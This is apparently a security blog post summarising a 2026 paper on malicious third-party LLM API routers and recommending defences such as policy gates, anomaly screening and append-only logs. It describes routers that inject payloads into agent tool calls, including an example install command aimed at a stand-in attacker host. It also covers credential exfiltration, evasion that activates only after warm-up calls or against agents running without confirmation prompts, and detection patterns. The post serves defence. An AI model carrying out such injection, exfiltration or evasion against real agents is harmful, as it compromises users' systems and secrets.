---
title: "Your Agent Is Mine: The LLM Router Supply Chain Attack You're Not Defending Against"
description: "Researchers bought 428 LLM API routers and found 9 actively injecting malicious code. Here's what that means for every agent that uses a third-party API proxy."
pubDate: 2026-04-27
tags: ["agent-security", "tool-use", "threat-modeling", "defense-patterns", "prompt-injection"]
---

If you're routing your LLM agent's API calls through a third-party proxy — and most production deployments are — you have a man-in-the-middle sitting between your agent and every model provider. That intermediary has full plaintext access to your system prompts, tool-call arguments, model outputs, and API keys.

And according to new research, roughly 2% of the specific subset of commodity marketplace routers the researchers tested were **actively weaponized** — and that number likely understates the risk in the uncontrolled market.

A paper accepted to CCS 2026, *"Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain"* (arXiv:2604.08407), is the first systematic study of this attack surface. The researchers bought 28 paid routers from Taobao, Xianyu, and Shopify storefronts, collected 400 free routers from open-source templates, and ran them through a structured threat model. What they found should reshape how you think about your agent's dependency graph.

## What Is an LLM API Router?

The setup is mundane, which is part of the problem. Your agent code calls `openai.chat.completions.create(...)`. You configure `base_url` to point to an intermediary service — maybe LiteLLM for self-hosted load balancing, OpenRouter for multi-provider access, or one of hundreds of commodity routers promising cheaper GPT-4 access.

That router receives your full request in plaintext, terminates your TLS connection, opens a new TLS connection to the actual model provider, and returns the response. No end-to-end cryptographic integrity exists between what the model generates and what your agent receives. The router can read, modify, or replace anything in flight.

This is not a theoretical weakness. It's the intentional architecture. The router *has* to be a man-in-the-middle to do load balancing, caching, and cost optimization. You've opted into this trust relationship every time you change `base_url`.

## Two Core Classes, Two Evasion Variants — Four Attacks Total

The paper formalizes four attack classes:

**AC-1: Payload Injection** — The router rewrites a tool-call response. Your agent asks to install a dependency; the router swaps the package name for an attacker-controlled one. Your agent executes `pip install legitimate-package` and gets `pip install malicious-package@evil.io`. Because the rewrite happens in the JSON layer *after* the model's reasoning loop, model-side safeguards don't help.

**AC-2: Secret Exfiltration** — The router copies your API keys, system prompts, and tool-call arguments to an attacker-controlled endpoint. Seventeen routers in the corpus touched researcher-owned AWS canary credentials. One drained ETH from a researcher-owned Ethereum private key. These weren't sophisticated exploits; the routers just logged everything and forwarded credentials to external endpoints.

The paper also documents two **adaptive evasion variants** — modifications to AC-1 that specifically evade detection:

**AC-1.a: Dependency-Targeted Injection** — The injection only activates for specific project types or tool names (Rust and Go projects were observed in the wild). A generic security test won't trigger it; the router detects context before striking.

**AC-1.b: Conditional Delivery** — The attack waits. Two routers in the wild implemented warm-up periods: one required 50 prior benign calls before injecting, another specifically targeted sessions operating in "YOLO mode" — autonomous agent configurations where the user has disabled confirmation prompts. The router fingerprints your agent's autonomy level and activates only against agents that will execute tool calls without human review.

Both evasion variants are siblings: they're both modifications of AC-1 (payload injection) that delay or target the activation of the attack. Neither is a subclass of the other.

## The Numbers

Out of 428 routers tested:
- **9 actively injecting malicious code** (1 paid, 8 free)
- **2 deploying adaptive evasion** (warm-up timers or YOLO-mode triggers)
- **17 touching researcher-owned AWS canary credentials**
- **1 draining ETH from a researcher-owned private key**

The paid router was sourced from Taobao — a storefront with over 30,000 repeat purchases for LLM API access. These are not obscure hobbyist projects. They're commodity services used at scale.

The researchers also ran two separate poisoning studies to show that even ostensibly benign routers can be pulled into the attack surface. In the first study, they intentionally leaked a researcher-owned OpenAI key on public forums — that single leaked key generated 100M GPT-5.4 tokens and more than 7 Codex sessions as routers picked it up and reused it. In the second study, they deployed weakly configured decoy proxies and observed unsolicited traffic from routers in the wild: roughly 2B billed tokens across 440 Codex sessions, 99 credentials exposed, and 401 sessions already operating in autonomous YOLO mode — meaning the decoy could have injected tool calls into 401 autonomous agent sessions simultaneously.

## Why This Is Different from Prompt Injection

The standard response to AI security threats is "just sanitize your inputs" or "add a guardrail model." Neither applies here.

These attacks happen **outside the model's reasoning loop**. When the router rewrites a tool-call response, the model never sees the rewrite. The agent's trust in its model is irrelevant; the model correctly reasoned about a legitimate request and issued a legitimate tool call. The router swapped the payload on the way back. The agent's safety training, its system prompt instructions, its constitutional AI fine-tuning — none of it is in scope.

This is the supply chain attack pattern applied to AI: you secure the endpoints, but the infrastructure connecting them is compromised. The attack surface shifted left, past where your defenses were designed to operate.

## What System-Level Defenses Actually Help

A concurrent paper on indirect prompt injection defenses (arXiv:2603.30016, Chong Xiang et al., March 2026) makes an argument that's directly relevant here. The paper calls for **system-level defenses** — architectural constraints that structure and control agent behavior, combining rule-based and model-based checks — rather than relying on the model alone to enforce security policy. Critically, it argues that certain context-dependent decisions still require learned models, but those decisions should be made within system designs that tightly constrain what the model can observe and decide. The lesson: the model doesn't disappear from the security loop, but it needs a structural skeleton around it.

The "Your Agent Is Mine" paper tests three client-side defenses with the Mine research proxy:

### 1. Fail-Closed Policy Gate

Before executing any tool call, the agent's runtime validates the response against a policy that specifies expected structure, allowed domains, and permitted package names. If the response doesn't match the policy, the tool call is dropped.

This works well for structured, predictable tool use (installing known packages, calling known APIs). It degrades for open-ended agents where tool-call responses are genuinely variable. The coverage-versus-openness tradeoff is real.

**Practical implementation**: For every tool your agent uses, define a schema for valid responses. Treat unexpected fields, unexpected URLs, or unexpected package names as an error condition requiring human review, not a warning to log.

### 2. Response-Side Anomaly Screening

A lightweight classifier runs on tool-call responses before the agent executes them. The classifier looks for code injection patterns, credential exfiltration structure, and unexpected command-line payloads.

This is model-side — you're adding another LLM call to check the router's output. The irony is real: you're using an LLM to guard against compromised LLM infrastructure. The researchers found this catches naive injections but fails against the adaptive evasion variants (AC-1.b), since the malicious payload was designed to look benign during classifier review.

**Practical implementation**: This is worthwhile as a second layer but shouldn't be your primary defense. Calibrate it to flag on high-confidence patterns (shell pipe-to-curl, credential-shaped strings), not to catch everything.

### 3. Append-Only Transparency Logging

Every tool-call request and response is written to an immutable, append-only log before execution. The log is signed and cannot be modified by the router or the agent's runtime.

This doesn't prevent attacks — it detects them after the fact. But it provides two things: a forensic record if something goes wrong, and a deterrent for adaptive evasion (the router can't know which sessions are monitored).

**Practical implementation**: Use a write-once storage endpoint (e.g., S3 Object Lock, Cloudflare R2 with retention) to store full tool-call logs. Pipe the logs to an alerting system that flags unexpected patterns. This is table stakes for any production agent — you need to know what your agent executed.

## The Architecture Change This Demands

The deeper lesson from this research is that your agent's trust model needs to be explicit about the intermediary layer.

When you configure `base_url` to point to a third-party router, you are extending full trust to that service — including trust to execute tool calls on your behalf. Most agent developers never frame it this way because the abstraction makes it invisible.

Here's the trust model you're implicitly running:

```
Agent Runtime  →  [TRUSTED]  →  Router  →  [UNTRUSTED??]  →  Model Provider
```

But this is the trust model that actually applies:

```
Agent Runtime  →  [IMPLICIT FULL TRUST]  →  Router  →  Model Provider
                          ↑
                  Attacker controls this
```

**If you treat the router as untrusted**, several things follow:

1. **Router responses are adversarial inputs.** Apply the same sanitization you'd apply to any external data. Don't execute tool calls from router responses without validation.

2. **Know which routers you're trusting and at what level.** A self-hosted LiteLLM instance, a vetted commercial proxy with published security practices, and an anonymous Taobao reseller represent radically different risk profiles. Don't conflate them. For agents that manage credentials, infrastructure, or financial resources, route through infrastructure you control or have explicit security SLAs with. The cost savings from commodity routers do not justify the exposure when tool execution has real-world consequences.

3. **Autonomous agents are higher-value targets.** The conditional delivery variant (AC-1.b) specifically targets YOLO mode. Agents with human-in-the-loop confirmation are harder to exploit because the injected command has to survive human review. This is one concrete reason why confirmation prompts aren't just UX friction — they're a security control.

4. **Your supply chain includes your router's dependencies.** The March 2026 LiteLLM compromise was a dependency confusion attack against the package itself. Even a router you trust can be poisoned if its package registry dependency chain is compromised.

## Practical Threat Model for Agent Teams

If you're shipping an AI agent to production this week, here's the prioritized checklist:

**Immediate (no-cost changes):**
- Audit every `base_url` configuration in your codebase. If it points to a service you don't control and don't have a security relationship with, treat it as a risk.
- Enable append-only logging of all tool-call requests and responses today. You can't defend what you can't observe.
- Pin your router package versions. Do not allow automatic minor version upgrades for any component in the LLM call path.

**Short-term (architectural):**
- Define response schemas for every tool your agent calls and enforce them at execution time, not just at design time.
- For agents that manage credentials, infrastructure, or financial resources: route through your own infrastructure, not commodity routers. The "router convenience" risk profile changes dramatically when tool execution has real-world consequences.

**Longer-term (policy):**
- Create a formal inventory of every third-party service in your agent's dependency graph that has access to plaintext request/response payloads.
- Evaluate whether autonomous agent configurations (YOLO mode equivalents) require additional controls at the router level or confirmation at the execution level.

## The Signal

Research attention is converging on a pattern: the attack surface in AI agent systems isn't primarily the model. It's the **infrastructure the model depends on** — the router in the middle, the tool execution environment, the memory store, the orchestration layer. Each of these is a trust boundary that practitioners rarely make explicit.

The "Your Agent Is Mine" paper is important not just for its empirical findings but for what it formalizes. Once you have a taxonomy (AC-1, AC-2, AC-1.a, AC-1.b), you can audit against it. Once you have a threat model, you can design for it. The fact that 9 out of 428 routers were actively weaponized is alarming — but the bigger finding is that **the entire category of third-party LLM routers was an unmodeled threat surface until this paper**.

If you're building agents that do anything consequential, your next security review should start here.

---

**Sources:**
- *Your Agent Is Mine: Measuring Malicious Intermediary Attacks on the LLM Supply Chain* — [arXiv:2604.08407](https://arxiv.org/abs/2604.08407) (Chen et al., CCS 2026)
- *Architecting Secure AI Agents: Perspectives on System-Level Defenses Against Indirect Prompt Injection* — [arXiv:2603.30016](https://arxiv.org/abs/2603.30016) (Xiang et al., March 2026)
